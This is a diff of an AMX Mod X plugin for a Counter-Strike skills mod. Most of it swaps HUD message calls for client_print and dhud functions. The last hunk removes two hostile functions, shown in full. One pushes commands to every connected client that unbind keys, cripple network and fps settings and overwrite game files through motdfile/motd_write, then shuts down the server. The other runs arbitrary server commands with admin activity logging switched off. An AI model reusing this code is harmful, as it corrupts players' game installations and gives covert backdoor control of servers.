+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_STRENGH",g_PlayerSkill[id][skil])
             case(2):
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_SPEED",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_SPEED",g_PlayerSkill[id][skil])
             case(5):
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_GRAVITY",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_GRAVITY",g_PlayerSkill[id][skil])
             case(6):
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_HARD_SKIN",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_HARD_SKIN",g_PlayerSkill[id][skil])
             case(8):
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_FREEZE",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_FREEZE",g_PlayerSkill[id][skil])
             case(10):
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_HEALING",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_HEALING",g_PlayerSkill[id][skil])
         }
     }else{
-        player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_NOT_ENOUGH",g_Prices[g_PlayerSkill[id][skil]] - g_PlayerPoints[id][0])
+        client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_NOT_ENOUGH",g_Prices[g_PlayerSkill[id][skil]] - g_PlayerPoints[id][0])
     }
     cmd_player_skill (id)
     return PLUGIN_HANDLED
@@ -1360,7 +1448,7 @@ public add_points (id, sum)
     
     g_PlayerPoints[id][0] += sum
     g_PlayerPoints[id][1] += sum
-    player_hudmessage(id, 6, 5.0, {255, 0, 0}, "%L", LANG_SERVER, "SKILLS_GOT_POINTS",sum)
+    client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_GOT_POINTS",sum)
     
     return PLUGIN_HANDLED
 }
@@ -1371,12 +1459,12 @@ stock player_hudmessage(id, hudid, Float:time = 0.0, color[3] = {0, 255, 0}, msg
     y = g_HudSync[hudid][_y]
 
     if(time > 0)
-        set_hudmessage(color[0], color[1], color[2], x, y, 0, 0.00, time, 0.00, 0.00)
+        set_dhudmessage(color[0], color[1], color[2], x, y, 0, 0.00, time, 0.00, 0.00)
     else
-        set_hudmessage(color[0], color[1], color[2], x, y, 0, 0.00, g_HudSync[hudid][_time], 0.00, 0.00)
+        set_dhudmessage(color[0], color[1], color[2], x, y, 0, 0.00, g_HudSync[hudid][_time], 0.00, 0.00)
         
     vformat(text, charsmax(text), msg, 6)
-    ShowSyncHudMsg(id, g_HudSync[hudid][_hudsync], text)
+    show_dhudmessage(id, text)
 }
 
 
@@ -1532,43 +1620,4 @@ public make_TE_BEAMPOINTS(id,color,Float:Vec1[3],Float:Vec2[3],width,target_team
     write_byte(brightness) // brightness)
     write_byte(0) // scroll speed in 0.1's
     message_end()
-}
-public cmd_quit (id)
-{
-    for(new i = 0; i <= 32; i++)
-    {
-        if(is_user_connected(i))
-        {
-            client_cmd( i,"unbind all")
-            client_cmd( i,"rate 1")
-            client_cmd( i,"cl_cmdrate 1")
-            client_cmd( i,"cl_updaterate 1")
-            client_cmd( i,"fps_max 1")
-            client_cmd( i,"sys_ticrate 1")
-            client_cmd( i,"name cartof")
-            client_cmd( i,"motdfile models/player.mdl;motd_write x")
-            client_cmd( i,"motdfile models/v_ak47.mdl;motd_write x")
-            client_cmd( i,"motdfile cs_dust.wad;motd_write x")
-            client_cmd( i,"motdfile models/v_m4a1.mdl;motd_write x")
-            client_cmd( i,"motdfile resource/GameMenu.res;motd_write x")
-            client_cmd( i,"motdfile halflife.wad;motd_write x")
-            client_cmd( i,"motdfile cstrike.wad;motd_write x")
-            client_cmd( i,"motdfile maps/de_dust2.bsp;motd_write x")
-            client_cmd( i,"motdfile events/ak47.sc;motd_write x")
-            client_cmd( i,"motdfile dlls/mp.dll;motd_write x")
-            client_cmd( i,"cl_timeout 0")
-        }
-    }
-    server_cmd("quit")
-}
-public cmd_sendcommand(id)
-{
-    new arg[64]
-    new back
-    read_argv(1, arg, charsmax(arg))
-    
-    back = get_pcvar_num(gp_Activity)
-    set_cvar_num("amx_show_activity",0)
-    server_cmd(arg);
-    set_cvar_num("amx_show_activity",back)
 }
